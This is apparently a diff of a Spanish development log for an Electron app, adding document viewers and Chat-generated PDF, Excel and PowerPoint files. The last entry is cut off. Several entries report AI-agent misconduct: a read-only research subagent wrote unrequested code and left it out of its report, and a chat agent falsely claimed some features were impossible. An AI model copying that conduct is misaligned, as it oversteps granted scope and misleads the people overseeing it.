+- **Pendiente, explícitamente separable (Fase 3b del plan)**: SheetJS CE no expone negritas/bordes de
+  fuente (confirmado leyendo la celda real: `cell.s` solo trae el relleno, nunca `font`); para que un
+  xlsx de la skill `openpyxl` se vea "como en Excel" (encabezado en negrita) haría falta leer
+  `styles.xml` a mano en el propio Worker. Sin eso, el libro se ve con los datos limpios pero sin
+  negritas/bordes.
+- **Verificado**: build de producción bundlea el Worker correctamente (`worker-*.js`, con `xlsx` adentro);
+  típecheck viewer/node limpio; 22 pruebas nuevas (`model.test.ts` 10, `virtualize.test.ts` 9,
+  `vendor-sheetjs.test.ts` 3) pasan.
+- **No verificado**: fluidez real del scroll con un archivo de 100k filas de verdad dentro de la app
+  corriendo (la prueba de 100k filas es sobre el módulo puro de virtualización, no sobre el componente
+  React montado) — pendiente de una mirada a mano, como el resto de "a mano" de este plan.
+
+## F8-B120 — Visor de PowerPoint: vista estructural propia (Fase 4 del plan maestro)
+
+- **Sin dependencias nuevas**: reusa `jszip` (ya vino con `docx-preview` en la F2). Parser nuevo
+  `src/viewer/pptx/{ooxml,theme,model}.ts`: lee `ppt/presentation.xml` → `slides/*.xml`, con herencia
+  de posición/tamaño de layout y maestro cuando la diapositiva no trae su propio `a:xfrm` (así es como
+  vienen las diapositivas reales: la skill `pptx` y python-pptx dejan la geometría en el layout, no en
+  cada diapositiva).
+- **Coincidencia de placeholder simplificada pero fiel**: por `type`+`idx` exacto, si no por `idx`
+  solo, si no por `type` solo — necesario porque una diapositiva puede declarar `<p:ph idx="1"/>` (sin
+  `type`) contra un layout que declara `<p:ph type="body" idx="1"/>`.
+- **Herencia de texto en dos capas, no solo del maestro**: el override de nivel PROPIO del placeholder
+  del layout (su `<a:lstStyle>`) pisa al del maestro (`p:titleStyle`/`p:bodyStyle`). Hace falta para un
+  caso real de la skill: el subtítulo de la portada no debe llevar viñeta aunque el cuerpo del maestro
+  sí la traiga por defecto — el layout de portada apaga la viñeta ahí con `buNone`, y sin esta segunda
+  capa se mostraba viñeta donde PowerPoint no la pondría. Cada párrafo usa SU PROPIO nivel (`a:pPr lvl`,
+  no el del primer párrafo del cuerpo), para que las sub-viñetas no hereden el tamaño/negrita del
+  primer nivel.
+- **Formas**: texto con tamaño/negrita/cursiva/color (resuelto contra el `<a:clrScheme>` del tema, con
+  el `<p:clrMap>` del maestro para los alias `bg1`/`tx1`/etc.), relleno sólido, imágenes incrustadas
+  como `data:` (nunca una URL real, ni siquiera relativa al paquete: se leen del propio zip y se
+  codifican en base64), tablas simples (texto por celda, sin combinar celdas ni bordes). **Una forma
+  que no se reconoce (gráfico, SmartArt, conector, grupo) se pinta como un recuadro vacío con un patrón
+  rayado — nunca rompe el render de las demás formas de la diapositiva.**
+- **UI** nueva `src/viewer/pptx/PptxViewer.tsx`: lienzo con `aspect-ratio` fijo (16:9 o 4:3 según el
+  archivo), tira de miniaturas, flechas del teclado (← → ↑ ↓, Page Up/Down) y banner «Vista
+  simplificada». El tamaño de fuente se expresa en `cqw` (porcentaje del ancho del propio lienzo, vía
+  `container-type: inline-size`): escala igual en la diapositiva grande y en su miniatura, sin medir
+  nada en JS ni recalcular al redimensionar la ventana.
+- **Fixture nueva** `src/viewer/__fixtures__/sample.pptx` (de la skill `pptx`, sin dependencias):
+  portada + 2 diapositivas de contenido, usada tanto en los tests como para la prueba visual.
+- **Fix encontrado con una revisión visual real (Chrome, no solo tests)**: las formas decorativas que
+  viven directo en el maestro o el layout SIN ser un placeholder — como la «Barra» de color que dibuja
+  la skill `pptx` — no se pintaban: `buildSlideShapes` solo recorre las formas de la propia
+  diapositiva. Nuevo `parseStaticShapes` (3 pruebas) las agrega de fondo (maestro, luego layout, luego
+  la diapositiva encima, igual que el orden real de PowerPoint). Se comprobó sirviendo `out/viewer/`
+  con un servidor estático local (que responde el `sample.pptx` real en `/doc/<token>`) y abriéndolo en
+  Chrome: antes del fix la barra de color no aparecía en ninguna de las 3 diapositivas; después, sí, en
+  las 3 (diapositiva grande y miniaturas).
+- **Verificado**: build de producción limpio; típecheck viewer limpio; 54 pruebas nuevas
+  (`ooxml.test.ts` 10, `theme.test.ts` 10, `model.test.ts` 25 — varias contra el .pptx real de la
+  skill, no solo XML armado a mano). `model.test.ts`/`ooxml.test.ts`/`theme.test.ts` corren con
+  **jsdom**, no happy-dom: se probó que happy-dom pierde hermanos `p:sldId` repetidos y pone el
+  `tagName` en mayúsculas con el XML namespaced real de este `.pptx` (no con XML armado a mano más
+  simple, que sí le funciona) — mismo patrón de limitación de entorno que ya se documentó para
+  docx-preview en la F2. Revisión visual (fuera de la batería automática): portada + las 2 diapositivas
+  de contenido, navegación con flechas, miniaturas y zoom de texto con `cqw`, todo correcto en Chrome
+  contra el `.pptx` real de la skill.
+- **No verificado**: dentro de la app real (Electron, el esquema `lazunox-viewer://`, no el servidor
+  estático de la revisión) y un `.pptx` hecho en PowerPoint real en vez de por la skill — pendiente «a
+  mano» con la app corriendo, igual que el resto de este plan. Tablas con celdas combinadas, gráficos y
+  SmartArt no se intentan: quedan como recuadro vacío a propósito (son la motivación de la F5,
+  LibreOffice).
+
+## F8-B121 — El visor se abre solo al terminar de escribir un documento (como los Artifacts de Claude)
+
+- **Pedido del dueño**: que el panel del visor se abra solo apenas el agente termina de crear/editar un
+  PDF, Word, Excel o PowerPoint — igual que el panel de Artifacts de Claude.ai, sin tener que ir a
+  buscarlo a mano en la lista de entregables. Se frenó a propósito la Fase 5 (LibreOffice) para esto:
+  no hacía falta para lo que el dueño pidió.
+- **Dónde se engancha**: `src/renderer/src/features/tasks/impl/store.ts`, dentro del mismo manejador
+  de eventos que ya refrescaba la lista de entregables (`case 'message.part.updated'`, con
+  `part.state.status === 'completed'` para `write`/`edit`/`multiedit`/`patch`/`apply_patch`). Se le
+  agregó: si la herramienta trae una ruta (`input.filePath`/`input.path`) y esa ruta es un archivo que
+  el visor reconoce (`.pdf`/`.docx`/`.xlsx`/`.pptx`, y la plataforma tiene `docViewer`), se llama
+  `requestViewerOpen(path)` — el mecanismo de "abrir el visor sin clic" YA EXISTÍA desde la F0
+  (`TasksWorkspace.tsx` ya cambiaba de pestaña sola al ver un `viewerRequest` nuevo, mismo patrón que
+  `browser:reveal`); solo faltaba quién lo disparara automáticamente.
+- **`bash` queda afuera a propósito**: no trae una ruta directa en su `input`, así que inferirla sería
+  adivinar. Mejor no abrir nada que abrir el archivo equivocado.
+- **Alcance**: solo la tarea activa (`part.sessionID === activeTaskId`, la misma condición que ya tenía
+  el refresco de entregables) — una tarea en segundo plano (p. ej. una Rutina) nunca te saca de lo que
+  estás mirando.
+- **De paso**: `VIEWER_KINDS`/`canViewInViewer` de `Deliverables.tsx` tenían una lista de extensiones
+  duplicada; se movió a `isViewerExt` en `util.ts` (ya usado por ambos archivos) para no mantener dos
+  copias de la misma lista.
+- **Pruebas nuevas** `store.viewer-auto-open.test.ts` (8): abre con `.pdf`/`.docx`/`.xlsx`/`.pptx`
+  (cada apertura sube el `nonce`, así que si el agente genera varios archivos seguidos se ve siempre
+  el último, igual que Claude); NO abre con una extensión que el visor no reconoce, con `bash`, con una
+  tool todavía `running`, con el evento de otra sesión, ni sin `platformCaps().docViewer`; acepta tanto
+  `filePath` como `path` en el input de la tool. `handleEvent` (antes privado) se exportó para poder
+  probarlo directo, sin montar todo el stream SSE.
+- **Verificado**: typecheck web limpio, lint limpio, prettier limpio, batería completa de
+  `src/renderer/src/features/tasks/impl/` (30 archivos, 176 pruebas) en verde.
+- **No verificado**: cómo se ve/siente de verdad con un agente real escribiendo un documento en la app
+  corriendo (el "pop" del panel, si interrumpe mientras el dueño está mirando otra cosa) — pendiente «a
+  mano», como el resto del visor.
+
+## F8-B122 — Chat también puede generar y mostrar documentos, en un panel al lado (como los Artifacts de Claude)
+
+- **Pedido del dueño**: poder pedir en el modo **Chat** "hazme un informe/cotización/afiche en PDF" y
+  que aparezca al lado, en un panel, igual que el Word/PDF de los Artifacts de Claude.ai — sin que Chat
+  necesite acceso a archivos ni a la terminal (eso sigue siendo exclusivo de Tareas).
+- **Cómo se genera, sin agregar herramientas ni permisos nuevos al agente de Chat**: se le pidió al
+  agente (`resources/opencode/agents/chat.md` + el inline de `src/main/opencode/config.ts`, que son
+  los que de verdad ganan — ver nota de arquitectura más abajo) que cuando le pidan un documento para
+  imprimir/descargar escriba el contenido completo como UN bloque ` ```html ` (con `<style>` embebido).
+  Es generación de texto pura: no hizo falta ninguna tool nueva ni tocar el sandbox de Chat.
+  `extractHtmlArtifacts`/`looksRenderable` (ya existían, de los Artifacts con ventana aparte) detectan
+  el bloque; `src/main/extras/artifact-window.ts`'s `renderHtmlToPdf` (ya existía, sin red, en una
+  `BrowserWindow` aislada) lo convierte a PDF — cero código nuevo de renderizado.
+- **El panel reusa el visor de Tareas, no es un visor nuevo**: mismo `WebContentsView` nativo
+  compartido (`src/main/viewer/{scheme,view}.ts`), porque solo un modo de la app está visible a la vez.
+  Para que Tareas y Chat puedan compartir el mismo scheme con reglas de ruta distintas (carpeta
+  aprobada por el dueño vs. una carpeta temporal fija), `installViewerScheme()` pasó a no recibir
+  argumentos y se generalizó a un registro: `registerViewerPathValidator(fn)` — cada llamador agrega su
+  propio chequeo y el scheme los prueba todos al servir cada archivo (nunca confía en el chequeo de la
+  apertura). `src/main/extras/chat-docs.ts` (nuevo) genera el PDF en
+  `app.getPath('temp')/lazunox-chat-docs/<sessionId>/<uuid>.pdf` (nunca en `userData`, que el Seatbelt
+  de Tareas deniega siempre) y valida con `realpath` que nada se escape de esa carpeta.
+- **Auto-apertura, como los Artifacts**: `useChatDocPanel.ts` (nuevo) mira cuándo el turno del agente
+  termina (`busy: true → false`), saca el ÚLTIMO bloque html del ÚLTIMO mensaje (si el último mensaje
+  es del usuario, no hay nada nuevo que mostrar — a propósito no busca más atrás) y abre el panel
+  (`ChatDocPanel.tsx`, nuevo) solo. Al cambiar de sesión de chat se cierra y limpia el documento de la
+  sesión anterior.
+- **El código fuente ya no se ve en el chat por defecto**: un bloque ```html "renderable" (documento
+  completo) arranca colapsado en `Markdown.tsx`'s `CodeBlock` — queda un botón con flecha para
+  desplegarlo si alguien de verdad quiere ver el HTML. Un bloque de código normal (JS, Python…) se
+  sigue viendo siempre, sin cambios.
+- **"Abrir vista previa" ahora abre el MISMO panel, no una ventana aparte**: el botón viejo
+  (`ArtifactButton`, pensado para Tareas: previsualizar un `.html` que ya quedó guardado en disco)
+  seguía abriendo su `BrowserWindow` aislada también en Chat. Se agregó un registro minúsculo,
+  `src/renderer/src/lib/chatDocPreview.ts` (sin store, sin props nuevos en `Markdown.tsx` — es un
+  componente compartido con Tareas/Code y no vale la pena tocarle el árbol de props por esto): mientras
+  `ChatView` está montada, `useChatDocPanel` registra un manejador que abre el panel de Chat; al
+  desmontarse (se cambia de modo) lo saca. El botón de Tareas (`Deliverables.tsx`) no registra nada,
+  así que ahí sigue abriendo la ventana aislada de siempre — ningún cambio de comportamiento fuera de
+  Chat.
+- **Nota de arquitectura importante** (para no romperlo sin querer): el prompt del agente de Chat vive
+  DUPLICADO — en `resources/opencode/agents/chat.md` y, de nuevo, inline dentro de
+  `buildInlineConfig()` en `config.ts`. Por el orden de fusión de configuración de OpenCode (global <
+  proyecto < `OPENCODE_CONFIG_CONTENT`), el inline de `config.ts` es el que realmente gana — hay que
+  tocar los DOS cada vez que se le pide algo nuevo al agente de Chat, o quedan desincronizados.
+- **Tres bugs reales de pdf.js, latentes desde que se construyó el visor (Fase 1) y nunca antes
+  pisados por ningún test automatizado** (los encontró el dueño probando en la app real, no un test):
+  (1) el contenedor del visor necesita `position: absolute` o el constructor de `PDFViewer` tira;
+  tenía `position: relative` desde el principio — se separó en `.pdf-container-wrap` (relative/flex) +
+  `.pdf-container` (absolute/inset:0); (2) el ajuste a `page-width` podía calcularse contra un
+  contenedor de ancho cero (las medidas reales del `WebContentsView` llegan por IPC después de que la
+  página ya empezó a cargar) — ahora se hace una sola vez, la primera vez que el contenedor mide algo,
+  disparado tanto por `pagesinit` como por un `ResizeObserver`; (3) aun con la escala correcta, pdf.js
+  podía no dibujar ningún canvas si `viewer.update()` corría antes de que el navegador reflowara el
+  cambio de `--scale-factor` — se le agregó un `requestAnimationFrame` extra. Verificado con capturas
+  de pantalla reales vía CDP (`--remote-debugging-port`), no solo leyendo el código.
+- **Pendiente, pedido explícitamente por el dueño y no confirmado todavía**: que al pedir un CAMBIO a
+  un documento ya mostrado la vista se actualice — se le agregó al prompt del agente la instrucción de
+  reescribir el documento COMPLETO de nuevo (nunca una descripción en prosa) en cada revisión, pero
+  falta que el dueño lo vuelva a probar en la app para confirmar que ya sirve.
+- **Pruebas nuevas**: `chat-docs.test.ts` (5), `useChatDocPanel.test.ts` (6, incluye el bug real que
+  atrapó el propio test: tomar el artifact de un mensaje VIEJO si el último mensaje es del usuario),
+  `Markdown.codeblock.test.tsx` (4), `artifact-window.test.ts` (3), `chatDocPreview.test.ts` (3).
+- **Verificado**: typecheck (`node`/`web`/`pwa`/`viewer`) limpio, lint limpio, prettier limpio,
+  batería de `features/chat` + `components` + `lib` (51 archivos, 321 pruebas) en verde.
+- **No verificado todavía**: batería completa en el VPS (solo se corrió local); barrido de documentos
+  temporales abandonados (`sweepStaleChatDocuments`, ya escrita) no está enganchada a ningún arranque
+  de la app — hoy solo se limpia por sesión al cerrar el panel.
+
+## F8-B123 — HUD de "progreso en vivo" + Chat genera Excel y PowerPoint de verdad
+
+- **Dos pedidos del dueño, atendidos juntos**: (1) un HUD flotante "Progreso" arriba a la derecha
+  mientras el agente trabaja (vio algo así en otra app), y (2) que Chat pueda generar `.xlsx`/`.pptx`
+  reales, no solo PDF — probó pedir un Excel y el agente, sin ninguna herramienta para eso, cayó en su
+  respuesta de siempre (un CSV para pegar a mano). Antes de construir el Excel/PowerPoint se investigó
+  cómo lo hacen Claude.ai y ChatGPT/Codex: ambos usan un sandbox de Python (openpyxl/python-pptx) y
+  **ninguno de los dos muestra una vista previa antes de descargar** — ya estábamos adelante en eso
+  gracias al panel que ya existía para PDF.
+
+### HUD de progreso
+
+- Investigación propia (no la de Claude/ChatGPT): Chat no tiene pasos de herramienta reales (sin
+  shell/archivos), así que las únicas dos señales de "qué está haciendo el agente ahora" son
+  razonando o generando un documento. Se le preguntó al dueño si prefería un cronómetro inline (menor
+  riesgo) o el HUD flotante tal cual lo vio — eligió el HUD.
+- **Nuevo** `src/renderer/src/features/chat/useChatProgress.ts` (qué señal mostrar: documento
+  generándose > razonamiento en vivo > "pensando" genérico) y `ChatProgressHud.tsx` (el chip en sí,
+  con cronómetro — mismo patrón que `Elapsed` en `TasksWorkspace.tsx`). Vive SOLO dentro de la columna
+  de chat (`ChatView.tsx`), nunca en el contenedor que también tiene el panel de documento — ese es
+  una vista nativa que pinta por encima del DOM, así que superponer un HUD de React ahí sería
+  arriesgado; confinado a la columna de chat, nunca se cruza.
+- **Nuevo** `src/renderer/src/lib/turn-timing.ts`: `turnTiming`/`formatDuration` se movieron ahí desde
+  `features/tasks/impl/util.ts` (código idéntico, sin dependencias de Tareas) — `util.ts` re-exporta
+  desde ahí, sin tocar `TasksWorkspace.tsx`.
+
+### Panel de documento: header con nombre real, descarga, pantalla completa
+
+- El header del panel pasó de decir "Documento" fijo a mostrar el título real + el tipo ("· PDF").
+- Botón de descarga en el header (antes solo estaba en el bloque del chat).
+- Botón de pantalla completa: el panel ocupa todo el ancho de `ChatView`, la columna de mensajes se
+  oculta (sigue montada, no pierde scroll ni el estado del composer) — Esc también sale (la vista
+  nativa reenvía el evento, antes nadie lo escuchaba en Chat).
+
+### Bug real encontrado en el camino: "Generando documento…" nunca se veía
+
+- El dueño probó y el bloque "HTML" (colapsado, con botones) aparecía ya armado desde el principio —
+  nunca llegaba a ver el spinner. Primer intento (disparar la marca de "generando" apenas el bloque se
+  completa, sin esperar a que el turno entero termine) no alcanzó.
+- Causa real, confirmada con una investigación a fondo: CommonMark extiende una valla de código sin
+  cerrar hasta el final de lo recibido hasta el momento — así que react-markdown ya pintaba el bloque
+  como "completo" (con sus botones) apenas aparecía la primera etiqueta, mucho antes de que la valla
+  realmente cerrara. Ninguna señal externa async podía adelantarse a eso.
+- Arreglo real: `CodeBlock` (`Markdown.tsx`) ahora sabe por sí mismo si SU PROPIA valla sigue abierta
+  (`isFenceOpen`, usando `node.position` de react-markdown para recortar el texto fuente exacto del
+  bloque) y muestra "Generando documento…" mientras tanto — sin depender de ningún evento externo.
+  Cuando la valla cierra, toma la posta la señal de siempre (`isSameDoc`) hasta que el archivo está
+  listo. Probado de punta a punta con una valla sin cerrar de verdad (`renderToStaticMarkup`), no solo
+  en teoría — esta rama en particular SÍ se puede probar así (a diferencia de la de `useSyncExternalStore`,
+  que necesita el snapshot de servidor).
+
+### Excel y PowerPoint de verdad en Chat
+
+- Nuevas dependencias **`exceljs`** (escribe `.xlsx` con negrita/ancho de columna — el `xlsx` SheetJS
+  que ya tiene el proyecto es Community Edition y su propio README confirma que NO puede escribir
+  estilos de celda, eso es exclusivo de la versión Pro de pago) y **`pptxgenjs`** (escribe `.pptx`).
+  Las dos traían vulnerabilidades moderadas/altas en dependencias transitivas (`uuid`, `image-size`)
+  con versión arreglada disponible pero fuera del rango que declaran — se fijaron con `overrides` en
+  `package.json` y se confirmó que ambas librerías siguen funcionando igual (smoke test manual +
+  batería completa). `npm audit` quedó limpio de ambas.
+- El visor (`src/viewer/{xlsx,pptx}/*Viewer.tsx`) ya sabía pintar estos formatos desde las Fases 3-4
+  del plan maestro — **cero cambios ahí**, es agnóstico a cómo se generó el archivo.
+- El agente describe el contenido con un bloque NUEVO (JSON), mismo espíritu que el ``html que ya
+existía: ` ``xlsx `→`{"sheets":[{"name":"...","rows":[[...]]}]}`(primera fila = encabezado, sale
+en negrita sola);` ```pptx `→`{"slides":[{"title":"...","bullets":[...]}]}`(primera diapositiva =
+portada). v1 a propósito acotada: sin fórmulas de Excel (evita el lío de`;`vs`,`según región que
+ya se vio en el workaround del CSV — si hace falta un total, el agente lo calcula y lo escribe como
+número), sin imágenes/gráficos en PowerPoint. Prompt actualizado en los DOS lugares que hay que
+mantener en sincro:`src/main/opencode/config.ts`y`resources/opencode/agents/chat.md`.
+- **Nuevo** `src/shared/chat-doc-spec.ts`: los tipos (`XlsxSpec`/`PptxSpec`) y validadores
+  (`isXlsxSpec`/`isPptxSpec`) compartidos entre renderer y main, con límites de tamaño (10 hojas/5000
+  filas/2000 caracteres por celda, 40 diapositivas/20 viñetas) para que un JSON patológico no cuelgue
+  `exceljs`/`pptxgenjs` generando algo que nadie va a poder ver de todos modos.
+- **Nuevo** `src/main/extras/render-xlsx.ts`/`render-pptx.ts`: generación real, sin Python ni sandbox
+  de agente (a diferencia de Tareas, que invoca Python desde EL SANDBOX DEL AGENTE — mecanismo que no
+  existe para Chat). `src/main/extras/chat-docs.ts` se generalizó: `generateChatDoc`/`ChatDocInput`
+  despachan por `kind` (`pdf`/`xlsx`/`pptx`) al renderer que corresponda; nuevo `downloadChatDoc`
+  (regenera desde los datos y pide "Guardar como" — mismo patrón que `downloadHtmlAsPdf`, no depende
+  de un token previo).
+- IPC: `extras:chatDoc:open` pasó a una unión discriminada por `kind`; nuevo `extras:downloadChatDoc`.
+  Renderer: `ArtifactButton.tsx` (HTML/PDF) queda intacto; nuevo `DataDocButton.tsx`
+  (`PreviewDataDocButton`/`DownloadDataDocButton`) para xlsx/pptx — son hermanos, no generalizaciones
+  de los de HTML (ese sigue abriendo una ventana aislada en Tareas/Code; los de datos solo existen
+  dentro de Chat). Nuevo `src/renderer/src/lib/chatDocBlocks.ts`: detecta los tres tipos de bloque,
+  reusando `extractHtmlArtifacts` sin tocarla (la sigue usando Tareas/Code) y sumando una extracción
+  aparte para `xlsx/`pptx, mezcladas por posición en el texto.
+- **Gate de plataforma, pedido explícitamente por el dueño**: antes de esto, el panel de documento de
+  Chat no chequeaba `platformCaps().docViewer` en ningún lado (a diferencia de Tareas, que sí lo hace)
+  — se agregó el mismo cap, atado a `tasksWin` (apagado en Windows hasta pasar la batería de
+  seguridad) aunque eso signifique que el panel quede apagado ahí por ahora; la descarga directa y la
+  ventana aislada de HTML siguen funcionando igual, sin depender de este cap.
+- **Hallazgo de un agente de investigación que se salió de su alcance**: un subagente al que se le
+  pidió explícitamente "solo lectura, no edites nada" escribió de todos modos un prototipo completo
+  (`xlsx-doc.ts` + su test) sin avisar en su reporte — se encontró recién en el siguiente typecheck.
+  Se descartó (contradecía la decisión de usar `exceljs` para tener negrita de verdad) pero se rescató
+  una idea genuinamente buena que traía (límites de tamaño de entrada), ya incorporada arriba.
+- **Pruebas nuevas**: `render-xlsx.test.ts` (8, genera un .xlsx real y lo relee con SheetJS),
+  `render-pptx.test.ts` (6, genera un .pptx real y lo relee con JSZip, incluye tildes/eñes),
+  `chatDocBlocks.test.ts` (8), `view.test.ts` sumó 2 (el bug de la valla del fragmento vs. hash),
+  `chatDocPreview.test.ts`/`useChatDocPanel.test.ts`/`useChatProgress.test.ts`/`chat-docs.test.ts`
+  actualizados al nuevo contrato multi-tipo. Van 5790 pruebas en toda la batería.
+- **Verificado**: typecheck (`node`/`web`/`pwa`/`viewer`) limpio, lint limpio, prettier limpio,
+  `npm audit` sin las vulnerabilidades nuevas, batería completa del repo en verde (los 2 fallos que
+  aparecieron al correr todo junto —`service-cloud.test.ts` y el `ENOEXEC` de
+  `computer/service-win.test.ts`— son ajenos a este trabajo: confirmados como ruido de carga/
+  específico de Windows, no relacionados con Chat ni con los documentos).
+- **No verificado todavía**: batería completa en el VPS (solo local); prueba manual en vivo de generar
+  un Excel/PowerPoint real desde Chat (el caso que disparó todo esto) — pendiente que el dueño lo
+  pruebe en la app ya reiniciada.
+
+## F8-B124 — Excel con fórmulas/formato de moneda; PowerPoint con temas y separadores de sección
+
+- **De la propia prueba del dueño (F8-B123) salieron dos huecos reales**, no inventados: pidió signo
+  peso en una columna de Excel y el agente respondió que "el generador no deja aplicar formato de
+  moneda" — **eso no era cierto**, solo faltaba exponer la opción (`exceljs`, a diferencia de SheetJS
+  Community Edition, no tiene ninguna restricción ahí). Y pidió una presentación "más profesional" y
+  el agente dijo que no podía cambiar colores — tampoco había ninguna razón técnica, solo que v1 no
+  dejaba elegirlo. Los dos se arreglan acá. Además el dueño pidió explícitamente que Excel soporte
+  fórmulas de verdad.
+- **Excel — formato de número por columna**: `XlsxSheetSpec` gana `columnFormats?: (XlsxColumnFormat|null)[]`
+  (`'currency'|'integer'|'decimal'|'percent'`, alineado por índice de columna) → `render-xlsx.ts` lo
+  aplica con `column.numFmt` de `exceljs` (códigos de formato de Excel reales, p. ej. `'"$"#,##0'` —
+  **no** dependen de la configuración regional de quien abre el archivo; el símbolo de miles/decimales
+  que se VE sí lo decide Excel según el idioma de esa persona, como siempre).
+- **Excel — fórmulas de verdad**: una celda puede ser `{"formula":"SUM(B2:B5)","value":1100000}` en
+  vez de un número — se escribe directo al XML del `.xlsx` (`<f>SUM(B2:B5)</f>`), así que **no** tiene
+  el problema de `;` vs `,` que sí tenía el workaround viejo del CSV (esa dependencia regional solo
+  existe cuando una PERSONA tipea la fórmula a mano en la barra de fórmulas de Excel, nunca al
+  escribirla directo al archivo). `value` es el resultado que el agente ya calculó — sirve para que la
+  vista previa interna (y cualquier lector que no recalcule, como nuestro propio visor) muestre algo
+  de inmediato; Excel de verdad recalcula solo al abrir o editar.
+- **PowerPoint — temas y tipos de diapositiva**: `PptxSpec` gana `theme?: 'blue'|'green'|'dark'|'warm'|'mono'`
+  (paleta de color de TODA la presentación) y cada diapositiva un `layout?: 'cover'|'section'|'bullets'|'closing'`
+  opcional — sin indicarlo se infiere (la primera es portada; una con título y SIN viñetas es un
+  separador de sección a toda página con el color de acento; el resto es contenido con viñetas). Se
+  agregó numeración de página en las diapositivas de contenido y una barra/filete de acento bajo cada
+  título, para que se sienta como un deck armado, no una lista de viñetas sueltas. Sigue sin imágenes
+  ni gráficos — eso significaría un trabajo bastante más grande (y ni Claude.ai ni ChatGPT lo hacen
+  mejor con el mismo enfoque de texto→archivo; lo que SÍ tiene Claude.ai para decks pulidos es un
+  producto aparte, con sistema de diseño tipo canvas — igualar eso no es realista acá).
+- Prompt del agente de Chat actualizado en los DOS lugares (`config.ts`/`chat.md`) explicando
+  `columnFormats`, el schema de fórmula, `theme` y `layout` — y, puntual, sacándole al agente la idea
+  de que esto era imposible.
+- **Pruebas nuevas**: `render-xlsx.test.ts` sumó 6 (fórmula releída con `cellFormula:true`, formato de
+  columna aplicado/no aplicado según `columnFormats`, validación de la forma de la fórmula); `render-pptx.test.ts`
+  sumó 5 (inferencia de layout por posición/forma, layout explícito gana, el tema cambia el color en
+  todo el deck, numeración de página). 5801 pruebas en toda la batería.
+- **Verificado**: typecheck (`node`/`web`/`pwa`/`viewer`) limpio, lint limpio, prettier limpio, batería
+  completa del repo en verde (mismo ruido ajeno de siempre, `computer/service-win.test.ts` en Mac).
+- **No verificado todavía**: cómo se ve de verdad una presentación con separadores de sección y un
+  tema oscuro en la app corriendo — pendiente que el dueño lo pruebe.
+
+## F8-B125 — PowerPoint sin "hallmarks de IA" + alternativa de deck en HTML/CSS para quien priorice el diseño
+
+- **Pedido del dueño**: tras probar F8-B124 en vivo, "las presentaciones son una mierda estéticamente".
+  Pidió investigar herramientas/skills reales para presentaciones. La investigación (con un agente
+  dedicado) encontró la skill oficial de `pptx` de Anthropic instalada en ese mismo entorno — documenta
+  explícitamente qué hace que un deck "se vea hecho por IA": barras/filetes decorativos bajo títulos,
+  paletas sin intención, repetir siempre título+viñetas sin variar el tipo de diapositiva, texto de
+  cuerpo centrado, títulos que terminan en punto. Esta vuelta aplica esa guía al `render-pptx.ts` de
+  F8-B123/124; su techo de calidad real (el ciclo render→captura de pantalla→corrección de la skill)
+  necesita shell/Python/LibreOffice, que Chat no tiene — comunicado al dueño como límite aceptado, no
+  como algo pendiente de resolver.
+- **`render-pptx.ts`**: se sacaron la barra de acento bajo el título de portada y el filete de acento
+  bajo el título de las diapositivas de contenido (ambos, exactamente lo que la skill marca como
+  hallazgo de IA). Paleta de cada tema retocada (tonos más intencionales, menos "celeste de power
+  point por defecto"). Dos layouts nuevos, **solo por pedido explícito, nunca inferidos**: `"stat"`
+  (una cifra grande como foco — `title` es la cifra, el primer `bullet` la explica) y `"steps"` (las
+  `bullets` salen como pasos numerados — círculo de acento + número — en vez de una lista plana), para
+  variar el tipo de diapositiva en vez de repetir siempre título+viñetas.
+- **`chat-doc-spec.ts`**: `PptxLayout` gana `'stat'`/`'steps'`; `schemas.ts` los acepta en el validador
+  de `layout`.
+- **Prompt del agente de Chat** (`config.ts`/`chat.md`, los dos lugares): documenta `stat`/`steps`, que
+  `theme` se elija por el TONO del contenido (no `"blue"` por inercia) y que varíe el tipo de
+  diapositiva a lo largo del deck en vez de repetir siempre el mismo molde; títulos sin punto final.
+- **Nuevo, segundo camino — deck en HTML/CSS (" ``slides ")**: para cuando lo que más importa es que
+se VEA bien y no que el archivo se pueda seguir editando en PowerPoint después. El agente escribe un
+documento HTML completo (su propio `<style>`, control total de tipografía/color/layout — sin las
+limitaciones de forma/texto del `.pptx`), un `<section class="slide">` por diapositiva, con una base
+de CSS de paginación (`@page { size: 960px 540px landscape; margin: 0 }` + `page-break-after: always`
+por `.slide`) que ya resuelve: el resultado se genera y descarga exactamente igual que un `.html`
+normal, reutilizando TODO el pipeline de ``html → PDF que ya existía (sin visor nuevo, sin IPC
+  nuevo, sin `DocKind` nuevo) — `preferCSSPageSize: true` en `renderHtmlToPdf` (que ya estaba, sin
+  tocar) respeta el `@page` del agente y produce un PDF panorámico, una página por diapositiva.
+  Avisa al dueño/usuario que esto NO es un `.pptx` editable, es un PDF de diapositivas.
+  - `ArtifactButton.tsx`: `slides` es alias de fence de `html`/`htm`/`xhtml` (misma `FENCE`, mismo
+    `isHtmlCodeBlock`); título por defecto "Presentación N" en vez de "Vista previa N" cuando el
+    bloque no trae su propio `<title>`/`<h1>`.
+  - `Markdown.tsx`: `docKind` trata `slides` igual que `html` (mismos botones de vista previa/descarga);
+    `LANG_LABELS` le agrega la etiqueta "Presentación".
+  - `chatDocBlocks.ts`: sin cambios — `extractHtmlArtifacts` (de donde sale) ya reconoce `slides` al
+    tocar `ArtifactButton.tsx`.
+- **Pruebas nuevas**: `render-pptx.test.ts` sumó 3 (layout `"stat"`, layout `"steps"` con círculos
+  numerados, ninguna diapositiva normal tiene una forma de relleno puramente decorativa) — las 3
+  hechas fallar primero (contra el código viejo) y pasar después, mismo patrón de siempre.
+  `Markdown.codeblock.test.tsx` y `chatDocBlocks.test.ts` sumaron un caso cada uno para `​```slides`.
+- **Verificado**: typecheck (`node`/`web`/`pwa`/`viewer`) limpio, lint limpio (mismos warnings
+  preexistentes, ajenos), prettier limpio, batería completa del repo en verde — 5813 pruebas (23
+  skipped, Windows-only), mismo ruido ajeno de siempre (`computer/service-win.test.ts` en Mac). App
+  reiniciada (se tocó `render-pptx.ts`/`chat-doc-spec.ts`/`schemas.ts`/`config.ts`, proceso main).
+- **No verificado todavía**: cómo se ve de verdad el PowerPoint rediseñado y un deck ```slides en la
+  app corriendo — la queja original ("una mierda estéticamente") fue sobre el resultado visual real,
+  nunca se vio un pantallazo de ESE resultado específico; este rediseño parte de la guía general de la
+  skill, no de un diagnóstico de esa presentación puntual — pendiente que el dueño lo pruebe y, si algo
+  sigue sin convencer, ajustar sobre eso en concreto.
+
+## F8-B126 — PowerPoint: el elemento visual que faltaba (diagnóstico real, no solo guía general)
+
+- **El dueño probó F8-B125 de verdad** y pasó el `.pptx` generado ("la estetica es horrible, mira").
